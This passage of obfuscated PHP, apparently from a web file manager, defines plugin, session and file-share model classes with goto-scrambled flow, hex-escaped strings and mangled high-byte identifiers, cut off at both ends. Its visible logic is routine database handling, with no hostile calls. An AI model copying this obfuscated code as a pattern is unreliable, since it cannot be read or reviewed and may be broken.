$cöóÎÔÔ”[409] => $cöóÎÔÔ”[1780] . $f„†°Üğé»); return $this->where($BÆÅŠ¿Í¨©)->delete(); } protected function removeBySource($C™í°âôÈ, $cİ˜Ò³Š) { $AÒèÕÈ‡’Î =& $_SERVER[µ…]; if (!$C™í°âôÈ || !$cİ˜Ò³Š) { return !1; } if (is_array($cİ˜Ò³Š)) { $cİ˜Ò³Š = array($AÒèÕÈ‡’Î[7], $cİ˜Ò³Š); } $B£»¼¿íìî = array($AÒèÕÈ‡’Î[1498] => 0, $AÒèÕÈ‡’Î[408] => $cİ˜Ò³Š, $AÒèÕÈ‡’Î[457] => array($AÒèÕÈ‡’Î[949], 0), $AÒèÕÈ‡’Î[409] => $AÒèÕÈ‡’Î[1780] . $C™í°âôÈ); return $this->where($B£»¼¿íìî)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\x70\154\165\x67\x69\x6e\x4c\151\x73\x74"; public $field = array("\x6e\x61\155\x65", "\x73\x74\x61\164\x75\x73", "\162\145\x67\151\x65\163\x74", "\x63\x6f\x6e\146\x69\x67"); public function loadList($c…Õñ©åÊ™ = false) { $A³ŒğœÌ„º = array_to_keyvalue($this->listData(), $_SERVER[µ…][28]); if ($c…Õñ©åÊ™) { return $A³ŒğœÌ„º[$c…Õñ©åÊ™]; } return $A³ŒğœÌ„º; } public function init() { $f§™ŒğëÍ =& $_SERVER[µ…]; Hook::trigger($f§™ŒğëÍ[1781]); $BğœÉ¨Âğ = $this->loadPluginList(); foreach ($BğœÉ¨Âğ as $Eİ¿¨ÀŸæ‹ => $a‹µ¡Ò¥İÈ) { $C…„¹™£ŒÔ = $this->appAllow($Eİ¿¨ÀŸæ‹, $a‹µ¡Ò¥İÈ); if (!$C…„¹™£ŒÔ) { continue; } foreach ($a‹µ¡Ò¥İÈ[$f§™ŒğëÍ[1782]] as $CğÉ¹ã—±ø => $aÂñùöš²) { Hook::bind($CğÉ¹ã—±ø, $aÂñùöš²); } } Hook::trigger($f§™ŒğëÍ[1783]); Hook::trigger(ACTION); } public function appAllow($e™¤êÍåøï, $D—£©Áºí, $A£äÂÜÀÏ³ = true) { $e¢áÖß¥Õ =& $_SERVER[µ…]; $B¹÷¬¡Ó÷ñ = PLUGIN_DIR . $e™¤êÍåøï . $e¢áÖß¥Õ[1784]; if (!is_array($D—£©Áºí) || !is_array($D—£©Áºí[$e¢áÖß¥Õ[1782]]) || $D—£©Áºí[$e¢áÖß¥Õ[704]] != 1 || !is_file($B¹÷¬¡Ó÷ñ)) { return !1; } if ($GLOBALS[$e¢áÖß¥Õ[479]] == 1) { return !0; } if ($A£äÂÜÀÏ³ && !Action($e¢áÖß¥Õ[1785])->checkAuth($e™¤êÍåøï)) { return !1; } return !0; } public function unInstall($C†ŒŞ«‚ÖÒ) { $D¡ë¨ åĞº =& $_SERVER[µ…]; $EõÁÎ¡É = $this->loadList($C†ŒŞ«‚ÖÒ); if (file_exists(PLUGIN_DIR . $C†ŒŞ«‚ÖÒ)) { Hook::apply($C†ŒŞ«‚ÖÒ . $D¡ë¨ åĞº[1786]); } $this->remove($EõÁÎ¡É[$D¡ë¨ åĞº[388]]); } public function changeStatus($A¨›·§…ÙÚ, $f¹Ğ‚ãë) { $bâÇæÖÖ‹” =& $_SERVER[µ…]; $e´à¡®£ = $this->loadList($A¨›·§…ÙÚ); if ($f¹Ğ‚ãë) { Hook::apply($A¨›·§…ÙÚ . $bâÇæÖÖ‹”[1787]); } $this->update($e´à¡®£[$bâÇæÖÖ‹”[388]], array($bâÇæÖÖ‹”[1788] => $f¹Ğ‚ãë)); } public function appRegist($dõƒë¿œ¯¢, $bœï…¶æè”) { $FéÁ§¯–óÄ =& $_SERVER[µ…]; $bÎØÒÃ…ã = $this->loadList($dõƒë¿œ¯¢); if ($bÎØÒÃ…ã) { $this->update($bÎØÒÃ…ã[$FéÁ§¯–óÄ[388]], array($FéÁ§¯–óÄ[1782] => $bœï…¶æè”)); } else { $C±³›ô‘  = array($FéÁ§¯–óÄ[28] => $dõƒë¿œ¯¢, $FéÁ§¯–óÄ[1782] => $bœï…¶æè”, $FéÁ§¯–óÄ[704] => 0, $FéÁ§¯–óÄ[6] => $this->getConfigDefault($dõƒë¿œ¯¢)); $this->insert($C±³›ô‘ ); } } public function getConfigDefault($BƒÌÆÇ¹œø) { $Fªƒ†îÄ®“ =& $_SERVER[µ…]; $dÜñßÃ‰†˜ = array(); $eÚ”ŸïÕØ‹ = $this->getPackageJson($BƒÌÆÇ¹œø); if (!$eÚ”ŸïÕØ‹ && is_array($eÚ”ŸïÕØ‹[$Fªƒ†îÄ®“[1789]])) { return $dÜñßÃ‰†˜; } foreach ($eÚ”ŸïÕØ‹[$Fªƒ†îÄ®“[1789]] as $a‚«ˆ™× => $a‹áÕÉ‚éÆ) { if (!isset($a‹áÕÉ‚éÆ[$Fªƒ†îÄ®“[370]]) || isset($dÜñßÃ‰†˜[$a‚«ˆ™×])) { continue; } $dÜñßÃ‰†˜[$a‚«ˆ™×] = $a‹áÕÉ‚éÆ[$Fªƒ†îÄ®“[370]]; } return $dÜñßÃ‰†˜; } public function getPackageJson($d¨¼äƒ”¿œ) { return Hook::apply($d¨¼äƒ”¿œ . $_SERVER[µ…][1790]); } public function getConfig($Cš„ÇÚ³ê, $A¨¶„…‰Ë = false) { $Cì¡‚–Ÿ­Õ =& $_SERVER[µ…]; $CŸæ…²ø = array(); $eÕµ•Ìàù = $this->loadList($Cš„ÇÚ³ê); if ($eÕµ•Ìàù && is_array($eÕµ•Ìàù[$Cì¡‚–Ÿ­Õ[6]])) { $CŸæ…²ø = $eÕµ•Ìàù[$Cì¡‚–Ÿ­Õ[6]]; } if (!$CŸæ…²ø || $A¨¶„…‰Ë) { $CŸæ…²ø = $this->getConfigDefault($Cš„ÇÚ³ê); } return $CŸæ…²ø; } public function setConfig($dæÌ‚¼©Ä, $fÌ©ñÊ‹Ç = false) { goto dæğ»„´ˆ; dæğ»„´ˆ: $f¦ŠÖ£ã¯á =& $_SERVER[µ…]; $C™÷±„Ğù’ = $this->loadList($dæÌ‚¼©Ä); if (!$C™÷±„Ğù’) { return !1; } goto F¿ Ÿ¡ˆİù; Dïõ‘½…ô: $this->update($C™÷±„Ğù’[$f¦ŠÖ£ã¯á[388]], array($f¦ŠÖ£ã¯á[6] => $AŸğ›æíĞô)); goto DÆÚÚÖšø; F¿ Ÿ¡ˆİù: $AŸğ›æíĞô = $C™÷±„Ğù’[$f¦ŠÖ£ã¯á[6]]; if ($fÌ©ñÊ‹Ç == !1) { $AŸğ›æíĞô = array(); $fÌ©ñÊ‹Ç = $this->getConfigDefault($dæÌ‚¼©Ä); } foreach ($fÌ©ñÊ‹Ç as $fòô•Íëó× => $Fˆ¸ä¦Ï°) { $AŸğ›æíĞô[$fòô•Íëó×] = is_string($Fˆ¸ä¦Ï°) ? trim($Fˆ¸ä¦Ï°) : $Fˆ¸ä¦Ï°; } goto Dïõ‘½…ô; DÆÚÚÖšø: } public function viewList() { goto A•÷•–‹„; Aİ–‹†ªê: return $eÑÑÀ‡„¨Ç; goto B½¹£ßØ–ï; cİµÊá³ˆ›: $dÖ²„¹‰®¿ = $this->loadPluginList(); $eÑÑÀ‡„¨Ç = array(); foreach ($dÖ²„¹‰®¿ as $Ešˆ±‘‘• => $f‡õ‘‘‚è­) { unset($f‡õ‘‘‚è­[$cóõ£©ˆ˜[1782]], $f‡õ‘‘‚è­[$cóõ£©ˆ˜[6]]); $d ù»ãî´ = PLUGIN_DIR . $f‡õ‘‘‚è­[$cóõ£©ˆ˜[28]] . $cóõ£©ˆ˜[1784]; if (!is_file($d ù»ãî´)) { continue; } $e™¡·Ëã‹ = Hook::apply($f‡õ‘‘‚è­[$cóõ£©ˆ˜[28]] . $cóõ£©ˆ˜[1790]); if (is_array($e™¡·Ëã‹)) { $eÑÑÀ‡„¨Ç[$Ešˆ±‘‘•] = array_merge($f‡õ‘‘‚è­, $e™¡·Ëã‹); } } goto Aİ–‹†ªê; A•÷•–‹„: $cóõ£©ˆ˜ =& $_SERVER[µ…]; $dÖ²„¹‰®¿ = $this->loadList(); $this->pluginScan($dÖ²„¹‰®¿); goto cİµÊá³ˆ›; B½¹£ßØ–ï: } private function loadPluginList() { $AÃ÷—ĞÅÛ =& $_SERVER[µ…]; $DæÕ¢¯Šê = $this->loadList(); if (strtolower(MOD) == $AÃ÷—ĞÅÛ[1791]) { return $DæÕ¢¯Šê; } $fÁ’ÍÒÁ«ƒ = Hook::trigger($AÃ÷—ĞÅÛ[1792], $DæÕ¢¯Šê); if ($DæÕ¢¯Šê && !$fÁ’ÍÒÁ«ƒ) { die; } return $fÁ’ÍÒÁ«ƒ ? $fÁ’ÍÒÁ«ƒ : $DæÕ¢¯Šê; } private function pluginScan($Fàê‰­…ŞË) { $cŠŸÃòš¢ =& $_SERVER[µ…]; recursion_dir(PLUGIN_DIR, $c£ËñÄ¿Ü„, $DÑé´ÈÛÇ, 0); foreach ($c£ËñÄ¿Ü„ as $e±Î­¬´æ) { $D¾Óï¥Œšˆ = get_path_this($e±Î­¬´æ); if (isset($Fàê‰­…ŞË[$D¾Óï¥Œšˆ]) || !file_exists($e±Î­¬´æ . $cŠŸÃòš¢[1793]) || !file_exists($e±Î­¬´æ . $cŠŸÃòš¢[1784])) { continue; } Hook::apply($D¾Óï¥Œšˆ . $cŠŸÃòš¢[1787]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\163\x74\x65\155\137\163\145\163\163\151\x6f\156"; public function get($B©¶ˆ’ÛÓ) { $b·ìËé—¢— =& $_SERVER[µ…]; $fÑñ‹Àõíã = $this->where(array($b·ìËé—¢—[1794] => $B©¶ˆ’ÛÓ))->find(); if (!is_array($fÑñ‹Àõíã)) { return !1; } return $fÑñ‹Àõíã[$b·ìËé—¢—[707]]; } public function set($DÀ” ¥ğ¢, $aÌÁóÚî‚º, $f„¦Á®‰µ´ = 3600) { $a­­Šå÷£ =& $_SERVER[µ…]; $cî·é½¦¤¿ = array($a­­Šå÷£[1794] => $DÀ” ¥ğ¢, $a­­Šå÷£[1702] => $aÌÁóÚî‚º, $a­­Šå÷£[1795] => $f„¦Á®‰µ´ + time()); if (Session::get($a­­Šå÷£[1796])) { $cî·é½¦¤¿[$a­­Šå÷£[1506]] = Session::get($a­­Šå÷£[1796]); } else { $cî·é½¦¤¿[$a­­Šå÷£[1506]] = 0; } if ($this->get($DÀ” ¥ğ¢)) { return $this->where(array($a­­Šå÷£[1794] => $DÀ” ¥ğ¢))->save($cî·é½¦¤¿); } else { return $this->add($cî·é½¦¤¿, array(), !0); } } public function remove($fàóğ–‹Éù) { return $this->where(array($_SERVER[µ…][1794] => $fàóğ–‹Éù))->delete(); } public function clearTimeout() { return $this->where($_SERVER[µ…][1797] . time())->delete(); } } goto A»ÖÀÁÙÖ‚; A»ÖÀÁÙÖ‚: class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\145"; protected $dataAuto = array(array("\x6d\157\x64\151\146\171\124\151\155\x65", "\x74\x69\155\145", "\151\x6e\163\145\162\164\x2c\165\160\144\x61\x74\x65", "\146\165\x6e\143\164\151\x6f\x6e"), array("\143\162\145\x61\x74\x65\x54\151\x6d\145", "\164\x69\x6d\x65", "\x69\156\163\145\x72\164", "\146\165\156\143\164\151\x6f\x6e"), array("\157\x70\x74\151\x6f\x6e\x73", '', "\151\156\163\x65\162\x74\54\x75\160\x64\x61\x74\x65\x2c\163\145\154\145\x63\x74", "\x6a\x73\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($E‹ÅÔç×‡Š) { $AÊ½ÖÄö„ =& $_SERVER[µ…]; $Cò¿ï‰•ŒÃ = isset($E‹ÅÔç×‡Š[0]) ? $E‹ÅÔç×‡Š[0] : !1; return array($AÊ½ÖÄö„[1798] => array(USER_ID, $AÊ½ÖÄö„[1799]), $AÊ½ÖÄö„[1742] => array($Cò¿ï‰•ŒÃ, $AÊ½ÖÄö„[1800])); } protected function listSimple() { $bø‹‚ƒå§Ó = array($_SERVER[µ…][1506] => USER_ID); $e½â³¨¨—š = $this->field($this->fieldList)->where($bø‹‚ƒå§Ó)->select(); return $e½â³¨¨—š ? $e½â³¨¨—š : array(); } protected function getInfo($a ÕÑïÀÆ„, $e÷¦î‰¶â” = false) { $BÑí©¾”ìÑ =& $_SERVER[µ…]; if ($e÷¦î‰¶â”) { return $this->_getShareInfo(array($BÑí©¾”ìÑ[462] => $a ÕÑïÀÆ„)); } $Aœê†É—ˆº = $this->cacheFunctionGet($BÑí©¾”ìÑ[1749], $a ÕÑïÀÆ„); return $Aœê†É—ˆº; } public function getInfoByHash($dô¢¸ÏÂÏ¬) { return $this->_getShareInfo(array($_SERVER[µ…][464] => $dô¢¸ÏÂÏ¬)); } public function getInfoByPath($D™¿ÅŸ¤„¸) { $D–©›ƒº =& $_SERVER[µ…]; $dÀóˆˆ²Û¯ = array($D–©›ƒº[1506] => USER_ID, $D–©›ƒº[390] => $D™¿ÅŸ¤„¸); return $this->_getShareInfo($dÀóˆˆ²Û¯); } public function getInfoBySourcePath($d‘ĞÔ ó¶°) { $F¾ÃÑ´ä§£ =& $_SERVER[µ…]; $féµ§“åÄ = array($F¾ÃÑ´ä§£[1506] => USER_ID, $F¾ÃÑ´ä§£[1048] => $d‘ĞÔ ó¶°); return $this->_getShareInfo($féµ§“åÄ); } private function _getShareInfo($d¥Úßãñ†Õ) { goto fè¿ã«ó†Ó; fè¿ã«ó†Ó: $CÓ‹´¸¿‘ =& $_SERVER[µ…]; $BÆÑ‰­÷Ğ = $this->where($d¥Úßãñ†Õ)->find(); if (!$BÆÑ‰­÷Ğ) { return !1; } goto Fİ‹·¸æÅ; FºÀ‹¦èí: if ($BÆÑ‰­÷Ğ[$CÓ‹´¸¿‘[390]] == $CÓ‹´¸¿‘[491]) { $BÆÑ‰­÷Ğ[$CÓ‹´¸¿‘[84]] = IO::info($BÆÑ‰­÷Ğ[$CÓ‹´¸¿‘[1048]]); } else { $BÆÑ‰­÷Ğ[$CÓ‹´¸¿‘[84]] = Model($CÓ‹´¸¿‘[1181])->pathInfo($BÆÑ‰­÷Ğ[$CÓ‹´¸¿‘[390]]); } $BÆÑ‰­÷Ğ[$CÓ‹´¸¿‘[1802]] = $AùÌàİ§Îá; return $BÆÑ‰­÷Ğ; goto f¿š·µ„»; Fİ‹·¸æÅ: $d¥Úßãñ†Õ = array($CÓ‹´¸¿‘[462] => $BÆÑ‰­÷Ğ[$CÓ‹´¸¿‘[462]]); $FŠ¤Øù…¤Ã = $CÓ‹´¸¿‘[1801]; $AùÌàİ§Îá = Model($CÓ‹´¸¿‘[559])->order($CÓ‹´¸¿‘[388])->field($FŠ¤Øù…¤Ã)->where($d¥Úßãñ†Õ)->select(); goto FºÀ‹¦èí; f¿š·µ„»: } protected function getInfoAuth($Eª•·‘œöó) { $cšœŠ¸µè =& $_SERVER[µ…]; $C¡µñ÷Ö¶˜ = $this->getInfo($Eª•·‘œöó); $C¡µñ÷Ö¶˜[$cšœŠ¸µè[400]] = Model($cšœŠ¸µè[476])->authMake($C¡µñ÷Ö¶˜[$cšœŠ¸µè[1802]]); return $C¡µñ÷Ö¶˜; } protected function listData($DºÌ‚ôŒ•È = null, $E—³å“¹í = 300) { $f‘äš«ƒ¦ƒ =& $_SERVER[µ…]; $dÈå§ŞØñ = array(array($f‘äš«ƒ¦ƒ[467] => array($f‘äš«ƒ¦ƒ[947], 0), $f‘äš«ƒ¦ƒ[469] => array($f‘äš«ƒ¦ƒ[947], 0), $f‘äš«ƒ¦ƒ[1803] => $f‘äš«ƒ¦ƒ[1757])); if ($DºÌ‚ôŒ•È == $f‘äš«ƒ¦ƒ[1804]) { $dÈå§ŞØñ = array($f‘äš«ƒ¦ƒ[467] => 1); } else { if ($DºÌ‚ôŒ•È == $f‘äš«ƒ¦ƒ[1033]) { $dÈå§ŞØñ = array($f‘äš«ƒ¦ƒ[469] => 1); } } $dÈå§ŞØñ[$f‘äš«ƒ¦ƒ[1506]] = USER_ID; $C–Ç»÷§’Ô = $this->where($dÈå§ŞØñ)->selectPage($E—³å“¹í); return $C–Ç»÷§’Ô; } protected function listToMe($BÁÅÜó†±ó = 300) { goto aÖÔ¢‰ö£; c¾ƒÀİôù½: if ($D¨ìÓÇ”º) { $f…¦‘¢‹”á = array(array($CÄ©¸‰ó”Í[544] => SourceModel::TYPE_USER, $CÄ©¸‰ó”Í[478] => USER_ID), array($CÄ©¸‰ó”Í[544] => SourceModel::TYPE_GROUP, $CÄ©¸‰ó”Í[478] => array($CÄ©¸‰ó”Í[7], $D¨ìÓÇ”º)), $CÄ©¸‰ó”Í[1803] => $CÄ©¸‰ó”Í[1757]); } $EÁ‚ÓÉí¯ò = Model($CÄ©¸‰ó”Í[559])->where($f…¦‘¢‹”á)->selectPage($BÁÅÜó†±ó); $C±ª¼Ô˜à½ = array_to_keyvalue_group($EÁ‚ÓÉí¯ò[$CÄ©¸‰ó”Í[365]], $CÄ©¸‰ó”Í[462]); goto fÉªêœçÂÅ; aÖÔ¢‰ö£: $CÄ©¸‰ó”Í =& $_SERVER[µ…]; $D¨ìÓÇ”º = Model($CÄ©¸‰ó”Í[1805])->userGroupParents(USER_ID); $f…¦‘¢‹”á = array($CÄ©¸‰ó”Í[544] => SourceModel::TYPE_USER, $CÄ©¸‰ó”Í[478] => USER_ID); goto c¾ƒÀİôù½; a¼éø„”á”: $A“Âİ‡æ = array($CÄ©¸‰ó”Í[1807] => $EÁ¢¦ê£, $CÄ©¸‰ó”Í[1808] => $EÁ‚ÓÉí¯ò[$CÄ©¸‰ó”Í[362]]); return $A“Âİ‡æ; goto Dá‘”øÚ²‡; fÉªêœçÂÅ: if (!$C±ª¼Ô˜à½) { return $EÁ‚ÓÉí¯ò; } $EİÁïÏ‹š‚ = $CÄ©¸‰ó”Í[1806]; $f…¦‘¢‹”á = array($CÄ©¸‰ó”Í[462] => array($CÄ©¸‰ó”Í[405], array_keys($C±ª¼Ô˜à½))); goto fíóÒÇ¿ÉÕ; fíóÒÇ¿ÉÕ: $EÁ¢¦ê£ = $this->field($EİÁïÏ‹š‚)->where($f…¦‘¢‹”á)->select(); foreach ($EÁ¢¦ê£ as $cñ°’¶¬²ª => &$f—ôÑ¢Á¯±) { $f—ôÑ¢Á¯±[$CÄ©¸‰ó”Í[1802]] = $C±ª¼Ô˜à½[$f—ôÑ¢Á¯±[$CÄ©¸‰ó”Í[462]]]; } unset($f—ôÑ¢Á¯±); goto a¼éø„”á”; Dá‘”øÚ²‡: } protected function shareAdd($C©ÉÌù½º—, $D¢´Û¹²Ş¡) { $F ËÀòØÑÙ =& $_SERVER[µ…]; $dÏ½óßòù = $this->_addShareData($C©ÉÌù½º—, $D¢´Û¹²Ş¡); if (!empty($D¢´Û¹²Ş¡[$F ËÀòØÑÙ[1809]])) { $this->_shareAuthSet($dÏ½óßòù, $D¢´Û¹²Ş¡[$F ËÀòØÑÙ[1809]]); } $this->shareEventAdd($C©ÉÌù½º—, $D¢´Û¹²Ş¡, $F ËÀòØÑÙ[1036]); return $dÏ½óßòù; } private function shareEventAdd($DÓí¼ñÁÎÃ, $eæâÔè·îÛ, $fœ«»™“„ = "\x61\x64\x64") { goto Aïƒä¸Û÷; EŠ‚¿¢÷Ô: if ($A¾º¤çì’[$eÎ¼‡¥Ñ÷Í[469]] == $eÎ¼‡¥Ñ÷Í[491] && $eæâÔè·îÛ[$eÎ¼‡¥Ñ÷Í[469]] == $eÎ¼‡¥Ñ÷Í[86]) { $DÍ«òå—˜° = $eÎ¼‡¥Ñ÷Í[1811]; } if ($A¾º¤çì’[$eÎ¼‡¥Ñ÷Í[469]] == $eÎ¼‡¥Ñ÷Í[86] && $eæâÔè·îÛ[$eÎ¼‡¥Ñ÷Í[469]] == $eÎ¼‡¥Ñ÷Í[491]) { $DÍ«òå—˜° = $eÎ¼‡¥Ñ÷Í[1814]; } Model($eÎ¼‡¥Ñ÷Í[528])->eventShare($DÓí¼ñÁÎÃ, $DÍ«òå—˜°); goto bË„Šá·â˜; bË„Šá·â˜: return; goto cÅÏ¾Õïë¨; e‰–¾„¯—: $DÍ«òå—˜° = $eÎ¼‡¥Ñ÷Í[1812]; if ($A¾º¤çì’[$eÎ¼‡¥Ñ÷Í[467]] == $eÎ¼‡¥Ñ÷Í[491] && $eæâÔè·îÛ[$eÎ¼‡¥Ñ÷Í[467]] == $eÎ¼‡¥Ñ÷Í[86]) { $DÍ«òå—˜° = $eÎ¼‡¥Ñ÷Í[1810]; } if ($A¾º¤çì’[$eÎ¼‡¥Ñ÷Í[467]] == $eÎ¼‡¥Ñ÷Í[86] && $eæâÔè·îÛ[$eÎ¼‡¥Ñ÷Í[467]] == $eÎ¼‡¥Ñ÷Í[491]) { $DÍ«òå—˜° = $eÎ¼‡¥Ñ÷Í[1813]; } goto EŠ‚¿¢÷Ô; Aïƒä¸Û÷: $eÎ¼‡¥Ñ÷Í =& $_SERVER[µ…]; if ($fœ«»™“„ == $eÎ¼‡¥Ñ÷Í[1036]) { if ($eæâÔè·îÛ[$eÎ¼‡¥Ñ÷Í[467]] == $eÎ¼‡¥Ñ÷Í[86]) { Model($eÎ¼‡¥Ñ÷Í[528])->eventShare($DÓí¼ñÁÎÃ, $eÎ¼‡¥Ñ÷Í[1810]); } if ($eæâÔè·îÛ[$eÎ¼‡¥Ñ÷Í[469]] == $eÎ¼‡¥Ñ÷Í[86]) { Model($eÎ¼‡¥Ñ÷Í[528])->eventShare($DÓí¼ñÁÎÃ, $eÎ¼‡¥Ñ÷Í[1811]); } return; } $A¾º¤çì’ = $this->getInfoByPath($DÓí¼ñÁÎÃ); goto e‰–¾„¯—; cÅÏ¾Õïë¨: } private function _addShareData($fí¦„ÀÖÑì, $EÂÄÍ‹çÍ = array()) { goto D©‘Ôø³¾; aø˜½—Ä‰: $Bï¸Ú‹ñ—Ş = $this->add($d‡‰ÄñÆĞì); $FĞÆ®†òÏ = array($dº·²ÉŒ„ğ[464] => short_id($Bï¸Ú‹ñ—Ş)); $this->where(array($dº·²ÉŒ„ğ[461] => $Bï¸Ú‹ñ—Ş))->save($FĞÆ®†òÏ); goto EŸ½ğÇõçğ; EŸ½ğÇõçğ: return $Bï¸Ú‹ñ—Ş; goto a³çøË¥Åå; bìœÅãëÍö: if ($fêİâ³²õŒ = $this->where($Aè”­†–¦)->find()) { return $fêİâ³²õŒ[$dº·²ÉŒ„ğ[462]]; } if ($fí¦„ÀÖÑì == 0) { $FêÓ¯¤èÑ = array($dº·²ÉŒ„ğ[28] => get_path_this($EÂÄÍ‹çÍ[$dº·²ÉŒ„ğ[75]])); } else { $FêÓ¯¤èÑ = Model($dº·²ÉŒ„ğ[769])->sourceInfo($fí¦„ÀÖÑì); if (!$FêÓ¯¤èÑ) { return !1; } } if (!$EÂÄÍ‹çÍ[$dº·²ÉŒ„ğ[1411]]) { $EÂÄÍ‹çÍ[$dº·²ÉŒ„ğ[1411]] = $FêÓ¯¤èÑ[$dº·²ÉŒ„ğ[28]]; } goto D·Ö÷ñÉÑÊ; D·Ö÷ñÉÑÊ: $d‡‰ÄñÆĞì = array($dº·²ÉŒ„ğ[1498] => USER_ID, $dº·²ÉŒ„ğ[404] => $fí¦„ÀÖÑì, $dº·²ÉŒ„ğ[1411] => $dº·²ÉŒ„ğ[33], $dº·²ÉŒ„ğ[467] => 0, $dº·²ÉŒ„ğ[469] => 0, $dº·²ÉŒ„ğ[1048] => $dº·²ÉŒ„ğ[33], $dº·²ÉŒ„ğ[303] => $dº·²ÉŒ„ğ[33], $dº·²ÉŒ„ğ[827] => $dº·²ÉŒ„ğ[33], $dº·²ÉŒ„ğ[1816] => 0, $dº·²ÉŒ„ğ[1817] => 0, $dº·²ÉŒ„ğ[470] => 0, $dº·²ÉŒ„ğ[471] => $dº·²ÉŒ„ğ[33], $dº·²ÉŒ„ğ[464] => $dº·²ÉŒ„ğ[33]); $d­æÚª‚Óç = explode($dº·²ÉŒ„ğ[47], $dº·²ÉŒ„ğ[1818]); foreach ($d­æÚª‚Óç as $C±„İÚå‡ó) { if (!isset($EÂÄÍ‹çÍ[$C±„İÚå‡ó])) { continue; } $d‡‰ÄñÆĞì[$C±„İÚå‡ó] = $EÂÄÍ‹çÍ[$C±„İÚå‡ó]; } goto aø˜½—Ä‰; D©‘Ôø³¾: $dº·²ÉŒ„ğ =& $_SERVER[µ…]; $Aè”­†–¦ = array($dº·²ÉŒ„ğ[404] => $fí¦„ÀÖÑì, $dº·²ÉŒ„ğ[1498] => USER_ID); if ($fí¦„ÀÖÑì == 0) { $Aè”­†–¦ = array($dº·²ÉŒ„ğ[1815] => $EÂÄÍ‹çÍ[$dº·²ÉŒ„ğ[1048]], $dº·²ÉŒ„ğ[1498] => USER_ID); } goto bìœÅãëÍö; a³çøË¥Åå: } private function _shareAuthSet($f’Õ†è¤Á¦, $BÔ‘äÉ™è) { goto bóğ‹«‹Âô; f£Û‰¬ÔÑ : $d¥ê›·˜®×->where(array($EªœâÏ¡æ[462] => $f’Õ†è¤Á¦))->delete(); $BÈùİ³ŒÍ = array(); foreach ($BÔ‘äÉ™è as $FõÎº‘³åÔ) { $cÓêËéÍ™¤ = SourceModel::TYPE_USER; if ($FõÎº‘³åÔ[$EªœâÏ¡æ[398]] == SourceModel::TYPE_GROUP) { $cÓêËéÍ™¤ = SourceModel::TYPE_GROUP; } $e®ÑÜÄ‹²ˆ = array($EªœâÏ¡æ[462] => $f’Õ†è¤Á¦, $EªœâÏ¡æ[398] => $cÓêËéÍ™¤, $EªœâÏ¡æ[478] => intval($FõÎº‘³åÔ[$EªœâÏ¡æ[478]]), $EªœâÏ¡æ[1765] => 0, $EªœâÏ¡æ[1819] => -1); if ($FõÎº‘³åÔ[$EªœâÏ¡æ[1765]]) { $e®ÑÜÄ‹²ˆ[$EªœâÏ¡æ[1765]] = $FõÎº‘³åÔ[$EªœâÏ¡æ[1765]]; } else { if ($FõÎº‘³åÔ[$EªœâÏ¡æ[1819]]) { $e®ÑÜÄ‹²ˆ[$EªœâÏ¡æ[1819]] = $FõÎº‘³åÔ[$EªœâÏ¡æ[1819]]; } } $BÈùİ³ŒÍ[] = $e®ÑÜÄ‹²ˆ; } goto aä µ×©°®; bóğ‹«‹Âô: $EªœâÏ¡æ =& $_SERVER[µ…]; if (!is_array($BÔ‘äÉ™è)) { return !1; } $d¥ê›·˜®× = Model($EªœâÏ¡æ[1769]); goto f£Û‰¬ÔÑ ; aä µ×©°®: return $d¥ê›·˜®×->addAll($BÈùİ³ŒÍ, array(), !0); goto f–Ï†Ğ”İ‹; f–Ï†Ğ”İ‹: } public function numViewAdd($C»Ğ¯©¦ŒÚ) { $cÒ—À›ÊË =& $_SERVER[µ…]; $d‚ˆ¡ ¼¶ = array($cÒ—À›ÊË[461] => $C»Ğ¯©¦ŒÚ); $this->where($d‚ˆ¡ ¼¶)->setAdd($cÒ—À›ÊË[1816]); } public function numDownloadAdd($d‘¶Óâäê‚) { $a‚ÀÄ²ÑÛó =& $_SERVER[µ…]; $D¤Ÿ¦°Ìï— = array($a‚ÀÄ²ÑÛó[461] => $d‘¶Óâäê‚); $this->where($D¤Ÿ¦°Ìï—)->setAdd($a‚ÀÄ²ÑÛó[1817]); } protected function shareEdit($aáŠÚéºƒ», $A…¢İÂùµ) { goto e¥„Ÿ‡ËÛ®; F¶§‡’Ö•: foreach ($DçóâÓ®í as $aºÈÜËÎè†) { if (!array_key_exists($aºÈÜËÎè†, $A…¢İÂùµ)) { continue; } $dá“°ëê”È[$aºÈÜËÎè†] = $A…¢İÂùµ[$aºÈÜËÎè†]; } $this->shareEventAdd($b¬£‘Œàí[$Dç…Ä—Â[390]], $A…¢İÂùµ, $Dç…Ä—Â[1636]); $this->where(array($Dç…Ä—Â[461] => $aáŠÚéºƒ»))->save($dá“°ëê”È); goto fÙ†òˆÌó“; fÙ†òˆÌó“: if (isset($A…¢İÂùµ[$Dç…Ä—Â[1809]])) { $this->_shareAuthSet($aáŠÚéºƒ», $A…¢İÂùµ[$Dç…Ä—Â[1809]]); } return !0; goto b§Îàƒù‹; DÔ‹¬»ÒĞ´: $this->_checkLinkShare($A…¢İÂùµ, $b¬£‘Œàí); $dá“°ëê”È = array(); $DçóâÓ®í = explode($Dç…Ä—Â[47], $Dç…Ä—Â[1820]); goto F¶§‡’Ö•; e¥„Ÿ‡ËÛ®: $Dç…Ä—Â =& $_SERVER[µ…]; $b¬£‘Œàí = $this->getInfo($aáŠÚéºƒ»); if (!$b¬£‘Œàí) { return !1; } goto DÔ‹¬»ÒĞ´; b§Îàƒù‹: } private function _checkLinkShare($d±Ì¯–æ˜, $F‚’åÌ®) { goto C¢¥Ü¥Ã¬‰; C¢¥Ü¥Ã¬‰: $dÍ»¢êÛƒ± =& $_SERVER[µ…]; if ($d±Ì¯–æ˜[$dÍ»¢êÛƒ±[467]] != $dÍ»¢êÛƒ±[86]) { return; } $cí¾½®Íáˆ = $F‚’åÌ®[$dÍ»¢êÛƒ±[84]][$dÍ»¢êÛƒ±[390]]; goto cˆ“È×…Êä; f¶—º¥‡ß¬: $AÎŠ¥ù®ÙÙ = $this->shareFileMeta($F²…ÓŞ»—§[$dÍ»¢êÛƒ±[441]]); if (isset($AÎŠ¥ù®ÙÙ[$dÍ»¢êÛƒ±[370]]) && $AÎŠ¥ù®ÙÙ[$dÍ»¢êÛƒ±[370]] == $dÍ»¢êÛƒ±[86]) { show_json(LNG($dÍ»¢êÛƒ±[1823]), !1); } goto bØ’³–ÄÆğ; cˆ“È×…Êä: if ($F‚’åÌ®[$dÍ»¢êÛƒ±[84]][$dÍ»¢êÛƒ±[29]] 